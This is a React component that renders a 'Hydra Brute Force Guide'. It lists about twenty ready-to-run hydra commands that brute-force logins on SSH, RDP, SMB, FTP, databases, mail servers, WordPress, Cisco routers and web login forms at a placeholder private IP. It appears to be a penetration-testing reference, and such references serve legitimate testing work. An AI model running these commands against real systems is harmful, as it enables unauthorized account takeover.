export const DocHydra = () => {
    const hydraCommands = [
      {
        title: "SSH Attack",
        cmd: "hydra -L users.txt -P passwords.txt ssh://192.168.1.1",
        desc: "Brute force SSH logins"
      },
      {
        title: "HTTP Form Attack",
        cmd: "hydra -l admin -P rockyou.txt 192.168.1.1 http-post-form \"/login.php:user=^USER^&pass=^PASS^:Invalid\"",
        desc: "Attacks web login forms"
      },
      {
        title: "FTP Attack",
        cmd: "hydra -L users.txt -P passwords.txt ftp://192.168.1.1",
        desc: "Brute force FTP logins"
    },
    {
        title: "RDP Attack",
        cmd: "hydra -L users.txt -P passwords.txt rdp://192.168.1.1",
        desc: "Brute force RDP logins"
    },
    {
        title: "SMB Attack",
        cmd: "hydra -L users.txt -P passwords.txt smb://192.168.1.1",
        desc: "Brute force SMB logins"
    },
    {
        title: "Telnet Attack",
        cmd: "hydra -L users.txt -P passwords.txt telnet://192.168.1.1",
        desc: "Brute force Telnet logins"
    },
    {
        title: "MySQL Attack",
        cmd: "hydra -L users.txt -P passwords.txt mysql://192.168.1.1",
        desc: "Brute force MySQL logins"
    },
    {
        title: "PostgreSQL Attack",
        cmd: "hydra -L users.txt -P passwords.txt postgres://192.168.1.1",
        desc: "Brute force PostgreSQL logins"
    },
    {
        title: "MSSQL Attack",
        cmd: "hydra -L users.txt -P passwords.txt mssql://192.168.1.1",
        desc: "Brute force Microsoft SQL Server logins"
    },
    {
        title: "LDAP Attack",
        cmd: "hydra -L users.txt -P passwords.txt ldap://192.168.1.1",
        desc: "Brute force LDAP authentication"
    },
    {
        title: "VNC Attack",
        cmd: "hydra -P passwords.txt vnc://192.168.1.1",
        desc: "Brute force VNC authentication"
    },
    {
        title: "SNMP Attack",
        cmd: "hydra -P passwords.txt snmp://192.168.1.1",
        desc: "Brute force SNMP community strings"
    },
    {
        title: "POP3 Attack",
        cmd: "hydra -L users.txt -P passwords.txt pop3://192.168.1.1",
        desc: "Brute force POP3 email logins"
    },
    {
        title: "IMAP Attack",
        cmd: "hydra -L users.txt -P passwords.txt imap://192.168.1.1",
        desc: "Brute force IMAP email logins"
    },
    {
        title: "SMTP Attack",
        cmd: "hydra -L users.txt -P passwords.txt smtp://192.168.1.1",
        desc: "Brute force SMTP email logins"
    },
    {
        title: "WordPress Login Attack",
        cmd: "hydra -L users.txt -P passwords.txt 192.168.1.1 http-post-form \"/wp-login.php:log=^USER^&pwd=^PASS^:Invalid\"",
        desc: "Brute force WordPress logins"
    },
    {
        title: "Cisco Router Attack",
        cmd: "hydra -P passwords.txt cisco://192.168.1.1",
        desc: "Brute force Cisco router passwords"
    },
    {
        title: "Oracle Attack",
        cmd: "hydra -L users.txt -P passwords.txt oracle://192.168.1.1",
        desc: "Brute force Oracle database logins"
    },
    {
        title: "RDP with Specific Domain",
        cmd: "hydra -L users.txt -P passwords.txt rdp://192.168.1.1 -V -t 4 -m domain=mydomain",
        desc: "Brute force RDP login with a specific domain"
    },
    {
        title: "HTTPS Basic Auth Attack",
        cmd: "hydra -L users.txt -P passwords.txt 192.168.1.1 https-get",
        desc: "Brute force HTTP basic authentication"
    },
    {
        title: "Custom Web Login Attack",
        cmd: "hydra -l admin -P passwords.txt 192.168.1.1 http-post-form \"/admin.php:user=^USER^&pass=^PASS^:Login failed\"",
        desc: "Brute force custom web login pages"
    }
      // Add more commands as needed
    ];
  
    return (
      <div className="p-4 md:p-6">
        <h2 className="text-xl font-semibold text-gray-800 mb-4 flex items-center gap-2">
          <span className="bg-red-100 text-red-800 p-1.5 rounded-md">🔑</span>
          Hydra Brute Force Guide
        </h2>
        
        <div className="grid gap-4">
          {hydraCommands.map((item, index) => (
            <div key={index} className="bg-gray-50 p-3 rounded-md border border-gray-200">
              <h3 className="font-medium text-gray-800 mb-1.5">{item.title}</h3>
              <code className="block bg-gray-200/80 p-1.5 rounded text-sm mb-1.5 overflow-x-auto">
                {item.cmd}
              </code>
              <p className="text-xs md:text-sm text-gray-600">{item.desc}</p>
            </div>
          ))}
        </div>
      </div>
    );
  };